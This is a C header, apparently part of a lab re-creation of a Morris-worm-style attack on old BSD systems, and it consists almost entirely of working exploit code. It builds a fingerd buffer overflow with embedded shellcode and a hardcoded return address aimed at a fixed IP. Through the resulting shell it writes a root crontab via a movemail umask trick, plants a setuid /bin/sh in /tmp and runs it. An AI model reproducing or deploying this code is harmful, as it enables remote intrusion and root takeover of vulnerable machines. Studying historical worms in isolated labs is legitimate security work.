#ifndef WORM_BSD_H_
#define WORM_BSD_H_
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <stdio.h>

#define TARGET_IP "172.20.0.12"
#define FINGERD_PORT 79

#define BUF_SIZE 532
#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
#define PAYLOAD_LEN 28
#define NOP 0x01

#define PATIENCE 3
#define IO_BUF_SIZE 2048

#define MOVEMAIL_EXPLOIT "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n"
#define CRONTAB_EXPLOIT "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n"
#define CHECK_FOR_SHELL "ls /tmp/sh\n" 
#define RUN_SHELL "/tmp/sh\n" 
#define NOT_FOUND "/tmp/sh not found"

create_sockaddr(serv_addr, ip, port)
	struct sockaddr_in *serv_addr; 
	char *ip; 
	int port;
{
	serv_addr->sin_family = AF_INET; 		
	serv_addr->sin_port = htons(port);
	serv_addr->sin_addr.s_addr = inet_addr(ip);
}	

create_exploit(buf, shellcode, buf_size, shellcode_len)
    char *buf;
    char *shellcode;
    int buf_size;
    int shellcode_len;
{
    int i;
	int j;

    /* Fill with NOPs */
    for (i = 0; i < buf_size; i++) buf[i] = NOP;
    
    /* Insert shellcode at offset 300 */
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];

	for (i = buf_size - 4*4 - 4; i < buf_size - 4; i ++) { 
		buf[i] = 0x00; 
	}

    /* Overwrite the return address area (approx 0x7ffeea38) */
    for (i = buf_size - 4; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}

read_from_sock(sock, io_buf, buf_size)
    int sock;
    char *io_buf;
    int buf_size;
{
    int num_tries;
    int n;
    int readfds;
    struct timeval tv;

	num_tries = 0;

    while (num_tries < PATIENCE) {
        readfds = (1 << sock); /* Manual bitmask for old BSD select */
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(sock + 1, &readfds, (int *)0, (int *)0, &tv) > 0) {
            n = read(sock, io_buf, buf_size - 1);
            if (n > 0) {
                io_buf[n] = '\0';
                printf("%s", io_buf);
                fflush(stdout);
                num_tries = 0;
            } else break;
        } else num_tries++;
    }
}

write_to_sock(sock, text)
    int sock;
    char *text;
{
    int len;
	
	len = strlen(text);
    write(sock, text, len);
}

get_root_shell_via_movemail_exploit(sock, io_buf, buf_size)
	int sock; 
	char *io_buf; 
	size_t buf_size; 
{
	write_to_sock(sock, MOVEMAIL_EXPLOIT);
	write_to_sock(sock, CRONTAB_EXPLOIT);

	do {
		write_to_sock(sock, CHECK_FOR_SHELL);
		read_from_sock(sock, io_buf, buf_size);
		
		sleep(10);
	} while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));

	write_to_sock(sock, RUN_SHELL);
}	
#endif
